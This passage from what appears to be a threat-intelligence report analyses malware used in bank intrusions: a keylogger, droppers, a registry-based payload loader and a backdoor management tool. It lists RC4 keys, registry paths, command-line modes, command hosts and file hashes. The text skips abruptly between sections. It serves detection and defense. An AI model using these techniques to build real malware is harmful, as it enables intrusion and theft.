However, it is registered as a service and gets an\nRC4 key and the payload from the registry values of its own service. The name of the service is\nnot fixed and is probably set during installation stage.\n\nHere is the registry value path for the RC4 key and encrypted payload respectively:\n**HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICENAME%\\Security\\Data2**\n**HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICENAME%\\Security\\Data0**\n\nThe code gets the 16-bytes RC4 key from the registry (f9 65 8b c9 ec 12 f9 ae 50 e6 26 d7 70\n**77 ac 1e) and encrypted payload, decrypts the payload with that key and then decrypts it one**\nmore time with the following hardcoded key (previously seen in the backdoor management tool):\n**53** **87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7**\n**B3 9F 15**\n\nThe final decrypted payload is loaded and started as a DLL in memory. At the time of analysis\nthe attackers managed to wipe the payload in the registry with a benign system file data, so only\nthe RC4 key remained untouched and was found in the registry.\n\n#### Malware 10: Keylogger\n\nMD5: 5ebfe9a9ab9c2c4b200508ae5d91f067\nKnown filenames: NCVlan.dat\nFile size: 73'216 bytes\n\n\n-----\n\nType: PE32+ executable (DLL) (GUI) x86-64, for MS Windows\nLink time: 2016.04.06 07:38:57 (GMT)\nLinker version: 10.0\nOriginal name: grep.dll\nUsed in: Incident #1\n\nThis module is a user-mode keylogger. It contains an export function with an empty name,\nwhich has the main functionality of the module.\n\nUpon starting it creates a new thread, which suggests that it has to be loaded by a custom PE\nloader (probably by the DLL Injector described in this paper, MD5:\n949e1e35e09b25fca3927d3878d72bf4). The main thread registers a new class named \"Shell\nTrayCls%RANDOM%\", where %RANDOM% value is an integer returned by the system rand\nfunction seeded with the current system time. Next, it creates a window called \"Shell\nTray%RANDOM%\". The new window registers a system-wide keyboard hook and starts\nrecording keypresses and Unicode text in context of the clipboard. The data is saved into a\ncurrent user profile directory in a file that is named after the username via the following template\nstring:\nNTUSER{%USERNAME%}.TxS.blf. For example, the full path that we discovered was\n\"C:\\Users\\[redacted]\\NTUSER.DAT{[redacted swift server user]}.TxS.blf\". The data written in\nthe file is encrypted with RC4 with the following hardcoded 64-bytes key:\n\n**53 55 4D A2 30 55 53 44 30 2C 30 3E 27 44 42 54**\n**20 4C 49 4D 49 54 43 55 53 44 30 2C 0D 0A 43 44**\n**54 19 53 55 4D 7F 31 55 53 44 32 36 35 2C 30 E4**\n**37 43 44 54 98 4C 49 4D 49 54 1B 55 53 44 30 2C**\n\nThe RC4 key is not entirely random and seems to contain chunks of readable ASCII text related\nto some database contents or queries:\n\n  - \"SUM.0USD0,0>'DBT LIMITCUSD0,..CDT.SUM.1USD265,0.7CDT.LIMIT.USD0,\"\n\nWe assume this is done to complicate the recognition of a password-like string by eye, or use a\nvalue that would cause some false-positives when scanning for such a pattern.\n\nThe keylogger data file is a binary log that contains sequences of records organized in blocks\nwhich have the following events inside:\n\n1. Session Start (Logon):\n\nContains username, type of session (rdp, console, etc), session id.\n2. Session Activity:\n\nContains active windows name and sequence of typed keys.\n3. Session End (Logoff):\n\nContains username, session id.\n\n\n-----\n\nEvery event record contains a DWORD timestamp.\n\nThe module also starts a watchdog thread that keeps monitoring the creation of a trigger-file\ncalled ODBCREP.HLP in the directory of the current DLL. If such file is found, the keylogger\nremoves the keyboard hook and unloads from the process immediately.\n\n#### Malware 11: Trojan Dropper 2\n\nFilename: gpsvc.exe\nMD5: 1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae\nSHA1: bedceafa2109139c793cb158cec9fa48f980ff2b\nFile Size: 3449344 bytes\nFile Type: PE32+ executable (console) x86-64, for MS Windows\nLink Time: 2016.12.08 00:53:20 (GMT)\nLinker version: 10.0\nUsed in: Polish bank\n\nThis module is a command line malware dropper/installer, which contains two data containers in\nthe resource section.\n\nThe dropper command line takes the following:\n**gpsvc.exe -e %name% - drop payload on disk**\n**gpsvc.exe -l - lists all registered services under netsvcs registry key[3].**\n**gpsvc.exe -a %param2% %param3% - registers a news service using %param2% as the**\nservice name and %param3% as the path to DLL file of service binary.

The list of commands to run is located in the following file path (let's\ncall it source file): C:\\Windows\\Temp\\TMP298.tmp. Once the commands are executed, it sleeps\nfor one second and starts the process again until the source file contains a line with just one\nword in it: \"die\".\n\nThis batch file opens and runs every command mentioned in the .tmp file and saves the output\nto C:\\Windows\\Temp\\TMP298.tmp.ret. Once it finds the word \"die\" in the source, it deletes the\nsource and the output file and quits. However, this batch file is either broken or implemented\nwith a bug. Note the line \"goto end\" and no label called \":end\" in the batch file.\n\nWe can only speculate how this file was used in the real attack, but one theory looks to be the\nmost probable: it was used as an awkward way to execute commands with SYSTEM user\nprivileges. While it is possible to run commands as a SYSTEM user when you have\nadministrative privileges on a target machine, getting an interactive shell requires more work. A\nbatch file like this could run in the background, quietly spawning cmd.exe in a loop and nonresource exhausting mode. Passing commands to the source file would allow attackers to\nconveniently execute them the next second and get the output via another text file. This infinite\nloop could be easily broken with the \"die\" keyword. So far, we believe that this file could serve\nas a privilege escalation trampoline for other unprivileged processes (such as usermode\nbackdoor).\n\n#### Malware 14. Backdoor Management Tool\n\nFilename: gpsvc.exe\nMD5: 85d316590edfb4212049c4490db08c4b\nSHA1: 4f0d7a33d23d53c0eb8b34d102cdd660fc5323a2\n\n\n-----\n\nFile Size: 753664 bytes\nFile Type: PE32 executable (console) Intel 80386, for MS Windows\nLink Time: 2015.08.24 10:21:52 (GMT)\nLinker version: 8.0\n\nThis module is a commandline tool that helps to install a new service. In addition it is capable of\ndoing code injection and works as a service itself. The binary is protected with Enigma\nProtector.\n\nIf the module is started without commandline arguments, it quits immediately.\n\nDepending on commandline options passed the tool may work in different modes.\n\n1. Service Enumeration Mode\n**Commandline:** _gpsvc.exe -l_\nThis mode is selected with commandline option -v. In this case the module get a list of\nservices from hardcoded registry value HKLM\\SOFTWARE\\Microsoft\\Windows\n**NT\\CurrentVersion\\svchost\\netsvcs. This value is a present on clean Windows installation**\nand usually contains a list of standard service names that may generate some network activity.\n\nThe code iterates through available services and prints to standard output every service\nit managed to open with read privileges (used just to confirm that the service is running). After\nthis the tool exits.\n\n2. Service Activation Mode\n**Commandline:** _gpsvc.exe -s %param1% %param2%_\nIn this mode the module registers and starts a new service if it doesn't exist. The service\nname is based on the current executable filename. The following commandline is stored in the\nregistry to start the service:\n\n\"%self_path%\" -k %param1% %param2%\nWhere %self_path% is full path to current executable and %param1%, %param2% are\npassed as-is from current commandline.\n\n3. File Payload Deployment\n**Commandline:** _gpsvc.exe -e %param1% %param2%_\nIn this mode the module extracts and stores additional executable on the filesystem\n(filepath is inside installation cryptocontainer). It uses %param2% to open the file as a\ncryptocontainer. Cryptocontainer is encrypted with two RC4 keys:\n\nA. KeyA which is 16 bytes of MD5 value from a string which is passed via %param1%\nB. KeyB is a hardcoded 32-byte binary value: 53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52\n\n**60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15**\nIt contains payload data to be installed into registry and some paths.\n\n4. Registry Payload Deployment\n**Commandline:** _gpsvc.exe -f %param1% %param2%_\nThis mode is very similar to \"File Payload Deployment\" described above, but in this case\nthe module is instructed to install the payload into the registry value.\n\n\n-----\n\n5. Service Test\n**Commandline:** _gpsvc.exe -o %param1%_\nThis mode is used to ensure that the service is running correctly by checking that a\nspecial event object named %param1% exists.\n\n6. Service Termination\n**Commandline:** _gpsvc.exe -t %param1%_\nThis mode is used signal the running service via special event object named %param1%\nto terminate execution.\n\n7. Payload Injection Mode\n**Commandline:** _gpsvc.exe -k %param1% %param2%_\nIn this mode the module assumes that it can be a service binary, so it tries to behave as\nservice. If it fails it falls back to regular standalone executable mode. Main purpose of this code\nis to find payload in the registry, decrypt it and inject into target process memory. The payload is\nstored in the following registry value:\n**HKLM\\SYSTEM\\CurrentControlSet\\services\\%servicename%\\Security\\Data2**\nIt is encrypted with RC4, and key is taken from the registry using the following binary value (16\nbytes): HKLM\\SYSTEM\\CurrentControlSet\\services\\%servicename%\\Security\\Data3.\n\nThe cryptocontainer used by this module contains a magic value after it's decrypted with MD5 of\nthe secret passed via commandline and hardcoded RC4 key. At offset 4 it has to contain the\nfollowing DWORD: 0xBC0F1DAD (AD 1D 0F BC).\n\n## Appendix: Indicator of Compromise\n\n#### Malware Hosts\n```\nsap.misapor[.]ch\ntradeboard.mefound[.]com:443\nmovis-es.ignorelist[.]com:443\nupdate.toythieves[.]com:8080\nupdate.toythieves[.]com:443\nexbonus.mrbasic[.]com:443\n\n Malware Hashes\n02f75c2b47b1733f1889d6bbc026157c\n06cd99f0f9f152655469156059a8ea25\n07e13b985c79ef10802e75aadfac6408\n09a77c0cb8137df82efc0de5c7fee46e\n0abdaebbdbd5e6507e6db15f628d6fd7\n16a278d0ec24458c8e47672529835117\n17bc6f5b672b7e128cd5df51cdf10d37\n\n```\n\n-----\n\n```\n198760a270a19091582a5bd841fbaec0\n1bfbc0c9e0d9ceb5c3f4f6ced6bcfeae\n1d0e79feb6d7ed23eb1bf7f257ce4fee\n268dca9ad0dcb4d95f95a80ec621924f\n2963cd266e54bd136a966bf491507bbf\n2de01aac95f8703163da7633993fb447\n2ef2703cfc9f6858ad9527588198b1b6\n3b1dfeb298d0fb27c31944907d900c1d\n459593079763f4ae74986070f47452cf\n474f08fb4a0b8c9e1b88349098de10b1\n579e45a09dc2370c71515bd0870b2078\n5d0ffbc8389f27b0649696f0ef5b3cfe\n5ebfe9a9ab9c2c4b200508ae5d91f067\n5fbfeec97e967325af49fa4f65bb2265\n6eec1de7708020a25ee38a0822a59e88\n7413f08e12f7a4b48342a4b530c8b785\n8387ceba0c020a650e1add75d24967f2\n85d316590edfb4212049c4490db08c4b\n949e1e35e09b25fca3927d3878d72bf4\n954f50301207c52e7616cc490b8b4d3c\n9d1db33d89ce9d44354dcba9ebba4c2d\nad5485fac7fed74d112799600edb2fbf\nb135a56b0486eb4c85e304e636996ba1\nb9be8d53542f5b4abad4687a891b1c03\nbbd703f0d6b1cad4ff8f3d2ee3cc073c\nc1364bbf63b3617b25b58209e4529d8c\nc635e0aa816ba5fe6500ca9ecf34bd06\ncb65d885f4799dbdf80af2214ecdc5fa\nce6e55abfe1e7767531eaf1036a5db3d\ne29fe3c181ac9ddbb242688b151f3310\ne62a52073fd7bfd251efca9906580839\nf5e0f57684e9da7ef96dd459b554fded\nfde55de117cc611826db0983bc054624\n\n```\n\n-----",
